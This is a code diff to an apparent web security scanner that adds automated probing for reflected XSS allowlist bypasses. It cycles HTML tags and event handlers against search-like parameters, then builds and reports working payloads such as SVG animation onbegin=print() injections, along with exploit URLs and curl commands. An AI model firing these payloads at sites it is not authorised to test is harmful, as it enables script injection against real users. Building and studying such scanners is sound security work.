@@ -13,6 +13,11 @@ from .xss_breakout_detector import detect_breakout_xss
 from .param_discovery import discover_parameters
 from .xss_scanner import extract_forms
 
+TAG_EVENT_ALLOWLIST_TECHNIQUE_ID = "xss_tag_event_allowlist_bypass"
+TAG_EVENT_ALLOWLIST_TECHNIQUE_NAME = "Bypass tag/event allowlist by probing accepted HTML tag and event handler"
+SVG_ANIMATION_ALLOWLIST_TECHNIQUE_ID = "xss_svg_animation_onbegin_allowlist_bypass"
+SVG_ANIMATION_ALLOWLIST_TECHNIQUE_NAME = "Bypass tag allowlist using SVG animation element with onbegin event"
+
 
 def _is_valid_param_name(name: str) -> bool:
     import re
@@ -192,6 +197,149 @@ def log(msg: str, level: str = 'INFO'):
     print(f"[{level}] {msg}")
 
 
+def _should_try_tag_event_allowlist(param_name: str) -> bool:
+    if not param_name:
+        return False
+    p = param_name.lower()
+    return any(tok in p for tok in ('search', 'q', 'query', 'keyword', 'term'))
+
+
+def _probe_tag_event_allowlist_breakout(client: httpx.Client, url: str, param_name: str) -> Optional[Dict]:
+    """
+    Detect allowlist-style reflected XSS where most tags/events are blocked but one
+    tag/event pair is accepted (for example body+onresize).
+    """
+    if not _should_try_tag_event_allowlist(param_name):
+        return None
+
+    svg_nested_tags = {"animatetransform", "animate", "set", "image", "title"}
+
+    def _tag_probe_payload(tag: str) -> str:
+        if tag in svg_nested_tags:
+            return f"<svg><{tag}>"
+        return f"<{tag}>"
+
+    def _event_probe_payload(tag: str, event: str) -> str:
+        if tag in svg_nested_tags:
+            return f"<svg><{tag} {event}=1>"
+        return f"<{tag} {event}=1>"
+
+    def _exploit_payload(tag: str, event: str) -> str:
+        if tag in svg_nested_tags:
+            return f'\"><svg><{tag} {event}=print()>'
+        return f'\"><{tag} {event}=print()>'
+
+    def _display_markup(tag: str, event: str) -> str:
+        if tag in svg_nested_tags:
+            return f"<svg><{tag} {event}=print()>"
+        return f"<{tag} {event}=print()>"
+
+    try:
+        parsed = urllib.parse.urlparse(url)
+        base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
+
+        def _req(payload: str):
+            resp = client.get(base_url, params={param_name: payload})
+            return resp
+
+        baseline_payload = "<img src=1 onerror=print()>"
+        baseline_resp = _req(baseline_payload)
+        if baseline_resp.status_code < 400:
+            return None
+
+        tag_candidates = ["body", "math", "animatetransform", "animate", "svg", "image", "title", "details", "marquee", "iframe", "a"]
+        allowed_tags: List[str] = []
+        for tag in tag_candidates:
+            r = _req(_tag_probe_payload(tag))
+            if r.status_code < 400:
+                allowed_tags.append(tag)
+        if not allowed_tags:
+            return None
+
+        event_candidates = ["onbegin", "onresize", "onload", "onanimationstart", "onfocus", "onclick", "onmouseover", "onerror"]
+        allowed_tag = None
+        allowed_event = None
+        for tag in allowed_tags:
+            for ev in event_candidates:
+                if tag == "svg" and ev == "onbegin":
+                    # Prefer executable SVG animation elements for onbegin probes.
+                    continue
+                r = _req(_event_probe_payload(tag, ev))
+                if r.status_code < 400:
+                    allowed_tag = tag
+                    allowed_event = ev
+                    break
+            if allowed_event:
+                break
+        if not allowed_tag or not allowed_event:
+            return None
+
+        successful_payload = _exploit_payload(allowed_tag, allowed_event)
+        final_resp = _req(successful_payload)
+        if final_resp.status_code >= 400:
+            return None
+        body = final_resp.text or ""
+        marker = f"{allowed_event}=print()"
+        if marker not in body:
+            return None
+
+        exploit_url = str(final_resp.url)
+        around = ""
+        idx = body.find(marker)
+        if idx != -1:
+            around = body[max(0, idx - 80):idx + 120]
+
+        reflected_markup = _display_markup(allowed_tag, allowed_event)
+        browser_steps = [
+            f"Open: {exploit_url}",
+            f"Observe reflected injection using {reflected_markup}",
+        ]
+        if allowed_tag == "body" and allowed_event == "onresize":
+            browser_steps.append("Use an iframe width change to auto-trigger onresize without user interaction")
+        if allowed_tag in svg_nested_tags and allowed_event == "onbegin":
+            browser_steps.append("SVG animation events auto-fire; observe print() without user interaction")
+
+        description_markup = f"<svg><{allowed_tag}>" if allowed_tag in svg_nested_tags else f"<{allowed_tag}>"
+
+        is_svg_animation = allowed_tag in svg_nested_tags and allowed_event == "onbegin"
+        technique_id = SVG_ANIMATION_ALLOWLIST_TECHNIQUE_ID if is_svg_animation else TAG_EVENT_ALLOWLIST_TECHNIQUE_ID
+        technique_name = SVG_ANIMATION_ALLOWLIST_TECHNIQUE_NAME if is_svg_animation else TAG_EVENT_ALLOWLIST_TECHNIQUE_NAME
+
+        return {
+            "vulnerability_type": "breakout_xss",
+            "context_type": "html_tag_event_allowlist",
+            "context_description": "Tag/event allowlist bypass in reflected HTML context",
+            "parameter": param_name,
+            "method": "GET",
+            "url": exploit_url,
+            "surrounding_code": "",
+            "context_snippet": around,
+            "required_escape": "Quote breakout and allowed event handler injection",
+            "successful_payload": successful_payload,
+            "payload_description": f"Allowlisted {description_markup} + {allowed_event} event handler",
+            "simple_payloads_blocked": True,
+            "encoding_layers": [],
+            "severity": "high",
+            "cvss_score": 7.5,
+            "technique_id": technique_id,
+            "technique_name": technique_name,
+            "remediation": "Use strict output encoding and a positive allowlist for safe tags/attributes; avoid reflecting raw HTML from user input.",
+            "exploitation": {
+                "curl_command": f"curl -X GET '{exploit_url}'",
+                "explanation": "Application blocks common vectors but allows an exploitable tag/event pair that still executes script.",
+                "browser_steps": browser_steps,
+            },
+            "evidence": {
+                "blocked_baseline_payload": baseline_payload,
+                "allowed_tag": allowed_tag,
+                "allowed_event": allowed_event,
+                "allowed_tags": allowed_tags,
+            },
+        }
+    except Exception:
+        return None
+
+
 def extract_url_parameters(url: str) -> List[Tuple[str, str]]:
     """
     Extract parameter names from URL query string
@@ -358,32 +506,38 @@ def scan_url_for_breakout_xss(url: str,
         common_params = fallback_params or ['q', 'search', 'query', 'keyword', 'term', 'id', 'page', 'url', 'redirect', 'name']
         url_params.extend([(p, 'GET') for p in common_params])
         log(f"No parameters discovered, falling back to common set: {', '.join(common_params)}", 'INFO')
-    
     # Step 4: Test each GET parameter
-    for param_name, method in url_params:
-        param_key = f"{param_name}:{method}"
-        if param_key in tested_params:
-            continue
-        
-        tested_params.add(param_key)
-        log(f"Testing GET parameter: {param_name}", 'INFO')
-        
-        vuln = detect_breakout_xss(
-            url=url,
-            param_name=param_name,
-            method='GET',
-            timeout=timeout,
-            headers=headers,
-            callback_url=callback_url,
-            safe_mode=safe_mode
-        )
-        
-        if vuln:
-            log(f"✓ BREAKOUT XSS found in parameter '{param_name}' (GET)", 'VULN')
-            vulnerabilities.append(vuln)
-        else:
-            log(f"  No breakout XSS in parameter '{param_name}'", 'DEBUG')
-    
+    with httpx.Client(timeout=timeout, follow_redirects=True, verify=False, headers=headers) as probe_client:
+        for param_name, method in url_params:
+            param_key = f"{param_name}:{method}"
+            if param_key in tested_params:
+                continue
+
+            tested_params.add(param_key)
+            log(f"Testing GET parameter: {param_name}", 'INFO')
+
+            allowlist_vuln = _probe_tag_event_allowlist_breakout(probe_client, url, param_name)
+            if allowlist_vuln:
+                log(f"BREAKOUT XSS found in parameter '{param_name}' (GET, allowlist bypass)", 'VULN')
+                vulnerabilities.append(allowlist_vuln)
+                continue
+
+            vuln = detect_breakout_xss(
+                url=url,
+                param_name=param_name,
+                method='GET',
+                timeout=timeout,
+                headers=headers,
+                callback_url=callback_url,
+                safe_mode=safe_mode
+            )
+
+            if vuln:
+                log(f"BREAKOUT XSS found in parameter '{param_name}' (GET)", 'VULN')
+                vulnerabilities.append(vuln)
+            else:
+                log(f"  No breakout XSS in parameter '{param_name}'", 'DEBUG')
+
     # Step 5: Test each POST parameter
     for param_name, method, form_data in form_params:
         if method != 'POST':
@@ -407,16 +561,16 @@ def scan_url_for_breakout_xss(url: str,
         )
         
         if vuln:
-            log(f"✓ BREAKOUT XSS found in parameter '{param_name}' (POST)", 'VULN')
+            log(f"BREAKOUT XSS found in parameter '{param_name}' (POST)", 'VULN')
             vulnerabilities.append(vuln)
         else:
             log(f"  No breakout XSS in parameter '{param_name}'", 'DEBUG')
     
     # Summary
     if vulnerabilities:
-        log(f"\n🚨 Found {len(vulnerabilities)} breakout XSS vulnerabilit{'y' if len(vulnerabilities) == 1 else 'ies'}", 'VULN')
+        log(f"\nFound {len(vulnerabilities)} breakout XSS vulnerabilit{'y' if len(vulnerabilities) == 1 else 'ies'}", 'VULN')
     else:
-        log(f"\n✓ No breakout XSS vulnerabilities detected", 'INFO')
+        log("\nNo breakout XSS vulnerabilities detected", 'INFO')
     
     return vulnerabilities
 
@@ -448,7 +602,10 @@ def format_breakout_vuln_for_report(vuln: Dict) -> Dict:
         'context_snippet': vuln.get('context_snippet'),
         'required_escape': vuln.get('required_escape'),
         'encoding_layers': vuln.get('encoding_layers', []),
+        'technique_id': vuln.get('technique_id'),
+        'technique_name': vuln.get('technique_name'),
         'remediation': vuln.get('remediation'),
         'exploitation': vuln.get('exploitation'),
         'simple_payloads_blocked': vuln.get('simple_payloads_blocked', True),
     }
+
